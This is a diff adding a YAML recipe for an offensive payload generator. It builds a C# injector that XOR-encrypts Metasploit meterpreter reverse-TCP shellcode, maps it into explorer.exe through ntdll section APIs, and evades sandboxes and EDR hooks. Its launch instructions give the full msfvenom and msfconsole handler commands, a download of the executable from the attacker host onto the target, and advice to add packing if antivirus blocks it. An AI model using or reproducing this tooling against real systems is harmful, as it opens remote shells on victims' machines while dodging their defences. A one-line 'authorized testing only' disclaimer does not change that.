@@ -1,0 +1,156 @@
+meta:
+  name: "C# XOR Sections Process Injection"
+  category: "Process Injection"
+  description: |
+    Advanced process injection using low-level ntdll APIs for memory-mapped shellcode execution.
+    
+    Features:
+    - NtCreateSection/NtMapViewOfSection for stealthy memory sharing
+    - XOR encryption for basic obfuscation (key: 0xfa)
+    - VirtualAllocExNuma sandbox evasion
+    - Targets explorer.exe process
+    - Avoids common EDR hooks on kernel32 APIs
+    
+    This technique creates a memory section object that is mapped into both
+    the current and target processes, allowing shellcode to be written locally
+    and executed remotely without using VirtualAllocEx/WriteProcessMemory.
+    
+    WARNING: For authorized security testing only!
+
+  effectiveness: "high"
+
+  mitre:
+    tactic: "TA0005 - Defense Evasion"
+    technique: "T1055.012 - Process Injection: Process Hollowing"
+
+  artifacts:
+    - "NtCreateSection API calls to ntdll.dll"
+    - "NtMapViewOfSection memory mapping"
+    - "CreateRemoteThread in explorer.exe"
+    - "RWX memory sections"
+    - "VirtualAllocExNuma sandbox checks"
+
+parameters:
+  - name: "lhost"
+    type: "ip"
+    description: "Attacker/C2 server IP address for reverse connection"
+    required: true
+
+  - name: "lport"
+    type: "port"
+    description: "Listener port on attacker machine"
+    required: true
+    default: 443
+
+  - name: "xor_key"
+    type: "hex"
+    description: "XOR encryption key (single byte, e.g., 'fa')"
+    required: false
+    default: fa
+
+  - name: "output_file"
+    type: "string"
+    description: "Output executable filename"
+    required: false
+    default: "injector.exe"
+
+  - name: "output_path"
+    type: "path"
+    description: "Output directory for generated payload"
+    required: false
+    default: "{config.output_dir}"
+
+preprocessing:
+  # Step 1: Generate raw shellcode using msfvenom
+  - type: "command"
+    name: "generate_shellcode"
+    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
+    output_var: "raw_shellcode"
+
+  # Step 2: XOR encrypt the shellcode
+  - type: "script"
+    name: "xor_encryption"
+    script: "xor_encrypt.py"
+    args:
+      data: "{{ raw_shellcode }}"
+      key: "{{ xor_key }}"
+    output_var: "xor_result"
+
+  # Step 3: Format encrypted shellcode as C# byte array
+  - type: "script"
+    name: "format_payload"
+    script: "format_csharp.py"
+    args:
+      data: "{{ xor_result.encrypted }}"
+      var_name: "buf"
+      bytes_per_line: 15
+    output_var: "csharp_payload"
+
+output:
+  type: "template"
+  template: "process_injection/xor_sections_inject.cs"
+  compile:
+    enabled: true
+    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
+  launch_instructions: |
+    C# XOR Sections Process Injection - Launch Instructions
+
+    Step 1: Start Metasploit Listener
+
+    Start msfconsole and configure the handler:
+
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+
+    Or manually in msfconsole:
+
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set LHOST {{ lhost }}
+    set LPORT {{ lport }}
+    set ExitOnSession false
+    exploit -j
+
+    Step 2: Transfer Payload to Target
+
+    Transfer the generated executable to the target Windows system:
+
+    Using Python HTTP server:
+    python3 -m http.server 8080
+
+    On target (PowerShell):
+    Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"
+
+    Step 3: Execute on Target
+
+    Simply run the executable (requires admin/SeDebugPrivilege):
+    {{ output_file }}
+
+    Or via PowerShell:
+    Start-Process {{ output_file }}
+
+    Step 4: Verify Connection
+
+    Check your Metasploit console for incoming session:
+    Sending stage (200262 bytes) to [target_ip]
+    Meterpreter session 1 opened
+
+    Notes:
+
+    - Uses NtCreateSection/NtMapViewOfSection to avoid kernel32 hooks
+    - Encrypted with XOR key 0x{{ xor_key }}
+    - Includes VirtualAllocExNuma sandbox evasion
+    - Injects into explorer.exe (requires elevated privileges)
+    - Memory sections avoid common EDR detection of VirtualAllocEx/WriteProcessMemory
+    - Requires x64 Windows system
+
+    Troubleshooting:
+
+    - If no connection: Check firewall rules on attacker machine
+    - If AV blocks: Consider additional obfuscation or packing
+    - Requires SeDebugPrivilege or admin rights to inject into explorer.exe
+    - Check that explorer.exe is running on target
+
+    Cleanup:
+
+    After testing, remove the payload:
+    Remove-Item {{ output_file }} -Force
